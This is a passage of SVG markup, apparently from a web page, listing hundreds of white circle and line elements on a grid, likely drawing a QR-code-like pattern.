                          <circle cx="226.77049180327867" cy="190.27868852459017" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="226.77049180327867" cy="299.75409836065575" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="231.98360655737704" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="231.98360655737704" cy="159" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="231.98360655737704" cy="185.0655737704918" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="231.98360655737704" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="231.98360655737704" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="231.98360655737704" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="23.459016393442624" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="65.16393442622952" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="148.57377049180326" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="169.4262295081967" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="242.40983606557376" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="258.04918032786884" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="237.19672131147541" cy="268.4754098360656" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="106.8688524590164" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="117.29508196721312" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="205.91803278688525" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="216.34426229508196" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="294.54098360655735" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="304.9672131147541" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="242.40983606557376" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="54.73770491803278" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="112.08196721311477" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="138.14754098360655" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="174.63934426229508" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="185.0655737704918" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="247.62295081967213" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="65.16393442622952" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="91.22950819672131" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="117.29508196721312" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="153.78688524590163" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="164.21311475409834" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="179.85245901639342" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="190.27868852459017" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="200.70491803278688" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="252.8360655737705" cy="242.40983606557376" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="13.032786885245901" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="28.672131147540984" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="159" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="169.4262295081967" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="179.85245901639342" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="221.55737704918033" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="258.04918032786884" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="258.04918032786884" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="263.2622950819672" cy="80.8032786885246" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="263.2622950819672" cy="91.22950819672131" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="263.2622950819672" cy="216.34426229508196" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="263.2622950819672" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="263.2622950819672" cy="304.9672131147541" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="263.2622950819672" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="23.459016393442624" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="54.73770491803278" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="101.65573770491804" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="117.29508196721312" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="138.14754098360655" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="148.57377049180326" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="174.63934426229508" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="205.91803278688525" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="268.4754098360656" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="273.6885245901639" cy="80.8032786885246" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="273.6885245901639" cy="132.93442622950818" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="273.6885245901639" cy="211.1311475409836" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="273.6885245901639" cy="304.9672131147541" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="273.6885245901639" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="127.72131147540985" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="169.4262295081967" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="273.6885245901639" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="294.54098360655735" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="278.90163934426226" cy="310.18032786885243" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="65.16393442622952" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="132.93442622950818" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="148.57377049180326" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="159" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="169.4262295081967" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="200.70491803278688" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="252.8360655737705" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="273.6885245901639" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="284.11475409836066" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="294.54098360655735" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="304.9672131147541" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="284.11475409836066" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="289.327868852459" cy="101.65573770491804" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="289.327868852459" cy="112.08196721311477" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="289.327868852459" cy="148.57377049180326" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="289.327868852459" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="289.327868852459" cy="294.54098360655735" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="294.54098360655735" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="294.54098360655735" cy="112.08196721311477" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="294.54098360655735" cy="190.27868852459017" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="294.54098360655735" cy="216.34426229508196" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="294.54098360655735" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="75.59016393442623" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="86.01639344262296" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="112.08196721311477" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="122.50819672131148" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="211.1311475409836" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="221.55737704918033" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="258.04918032786884" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="299.75409836065575" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="299.75409836065575" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="44.31147540983606" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="153.78688524590163" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="169.4262295081967" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="205.91803278688525" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="216.34426229508196" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="226.77049180327867" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="278.90163934426226" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="304.9672131147541" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="304.9672131147541" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="65.16393442622952" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="159" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="174.63934426229508" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="195.4918032786885" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="211.1311475409836" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="221.55737704918033" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="310.18032786885243" cy="315.39344262295083" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="315.39344262295083" cy="65.16393442622952" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="315.39344262295083" cy="96.44262295081968" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <circle cx="315.39344262295083" cy="216.34426229508196" fill="#fff" r="2.085245901639344"></circle><!----><!---->
                          <line stroke-linecap="round" x1="159" x2="159" y1="70.37704918032787" y2="80.8032786885246" stroke="#fff"
                            stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="159" x2="159" y1="96.44262295081968" y2="106.8688524590164" stroke="#fff"
                            stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="159" x2="159" y1="216.34426229508196" y2="221.55737704918033" stroke="#fff"
                            stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="2.6065573770491803" x2="2.6065573770491803" y1="70.37704918032787"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="2.6065573770491803" x2="2.6065573770491803" y1="106.8688524590164"
                            y2="122.50819672131148" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="2.6065573770491803" x2="2.6065573770491803" y1="205.91803278688525"
                            y2="221.55737704918033" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="2.6065573770491803" x2="2.6065573770491803" y1="268.4754098360656"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="49.52459016393443"
                            y2="54.73770491803278" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="75.59016393442623"
                            y2="86.01639344262296" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="101.65573770491804"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="174.63934426229508"
                            y2="195.4918032786885" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="221.55737704918033"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="237.19672131147541"
                            y2="242.40983606557376" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="7.8196721311475414" x2="7.8196721311475414" y1="268.4754098360656"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="13.032786885245901" x2="13.032786885245901" y1="49.52459016393443"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="13.032786885245901" x2="13.032786885245901" y1="86.01639344262296"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="13.032786885245901" x2="13.032786885245901" y1="159" y2="169.4262295081967"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="13.032786885245901" x2="13.032786885245901" y1="263.2622950819672"
                            y2="273.6885245901639" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="18.245901639344265" x2="18.245901639344265" y1="96.44262295081968"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="18.245901639344265" x2="18.245901639344265" y1="132.93442622950818"
                            y2="138.14754098360655" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="18.245901639344265" x2="18.245901639344265" y1="148.57377049180326"
                            y2="153.78688524590163" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="18.245901639344265" x2="18.245901639344265" y1="174.63934426229508"
                            y2="179.85245901639342" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="18.245901639344265" x2="18.245901639344265" y1="190.27868852459017"
                            y2="200.70491803278688" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="23.459016393442624" x2="23.459016393442624" y1="44.31147540983606"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="23.459016393442624" x2="23.459016393442624" y1="122.50819672131148"
                            y2="127.72131147540985" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="23.459016393442624" x2="23.459016393442624" y1="143.36065573770492"
                            y2="169.4262295081967" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="23.459016393442624" x2="23.459016393442624" y1="179.85245901639342"
                            y2="185.0655737704918" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="23.459016393442624" x2="23.459016393442624" y1="211.1311475409836"
                            y2="216.34426229508196" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="23.459016393442624" x2="23.459016393442624" y1="263.2622950819672"
                            y2="268.4754098360656" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="44.31147540983606"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="143.36065573770492"
                            y2="148.57377049180326" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="169.4262295081967"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="200.70491803278688"
                            y2="205.91803278688525" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="221.55737704918033"
                            y2="226.77049180327867" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="237.19672131147541"
                            y2="247.62295081967213" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="28.672131147540984" x2="28.672131147540984" y1="258.04918032786884"
                            y2="263.2622950819672" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="39.0983606557377" x2="39.0983606557377" y1="96.44262295081968" y2="106.8688524590164"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="39.0983606557377" x2="39.0983606557377" y1="117.29508196721312" y2="122.50819672131148"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="39.0983606557377" x2="39.0983606557377" y1="143.36065573770492" y2="148.57377049180326"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="39.0983606557377" x2="39.0983606557377" y1="179.85245901639342" y2="185.0655737704918"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="39.0983606557377" x2="39.0983606557377" y1="205.91803278688525" y2="237.19672131147541"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="7.8196721311475414" y2="39.0983606557377"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="106.8688524590164"
                            y2="122.50819672131148" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="132.93442622950818"
                            y2="138.14754098360655" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="148.57377049180326"
                            y2="169.4262295081967" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="179.85245901639342"
                            y2="200.70491803278688" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="242.40983606557376"
                            y2="268.4754098360656" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="44.31147540983606" x2="44.31147540983606" y1="289.327868852459" y2="294.54098360655735"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="2.6065573770491803"
                            y2="7.8196721311475414" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="44.31147540983606" y2="49.52459016393443"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="117.29508196721312"
                            y2="132.93442622950818" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="174.63934426229508"
                            y2="185.0655737704918" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="205.91803278688525"
                            y2="211.1311475409836" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="231.98360655737704"
                            y2="237.19672131147541" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="49.52459016393443" x2="49.52459016393443" y1="258.04918032786884"
                            y2="268.4754098360656" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="54.73770491803278" x2="54.73770491803278" y1="54.73770491803278"
                            y2="59.950819672131146" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="54.73770491803278" x2="54.73770491803278" y1="70.37704918032787" y2="80.8032786885246"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="54.73770491803278" x2="54.73770491803278" y1="122.50819672131148"
                            y2="127.72131147540985" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="54.73770491803278" x2="54.73770491803278" y1="247.62295081967213"
                            y2="258.04918032786884" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="44.31147540983606"
                            y2="49.52459016393443" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="65.16393442622952"
                            y2="70.37704918032787" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="80.8032786885246"
                            y2="91.22950819672131" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="101.65573770491804"
                            y2="106.8688524590164" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="138.14754098360655"
                            y2="143.36065573770492" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="169.4262295081967"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="185.0655737704918"
                            y2="211.1311475409836" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="221.55737704918033"
                            y2="231.98360655737704" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="247.62295081967213"
                            y2="252.8360655737705" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="59.950819672131146" x2="59.950819672131146" y1="294.54098360655735"
                            y2="310.18032786885243" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="59.950819672131146"
                            y2="70.37704918032787" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="80.8032786885246" y2="91.22950819672131"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="112.08196721311477"
                            y2="117.29508196721312" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="127.72131147540985"
                            y2="132.93442622950818" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="164.21311475409834"
                            y2="174.63934426229508" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="221.55737704918033"
                            y2="231.98360655737704" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="252.8360655737705" y2="263.2622950819672"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="273.6885245901639"
                            y2="278.90163934426226" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="65.16393442622952" x2="65.16393442622952" y1="310.18032786885243"
                            y2="315.39344262295083" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="23.459016393442624"
                            y2="28.672131147540984" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="39.0983606557377" y2="44.31147540983606"
                            stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="59.950819672131146"
                            y2="75.59016393442623" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="96.44262295081968"
                            y2="101.65573770491804" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
                          <line stroke-linecap="round" x1="70.37704918032787" x2="70.37704918032787" y1="179.85245901639342"
                            y2="200.70491803278688" stroke="#fff" stroke-width="4.170491803278688"></line><!----><!---->
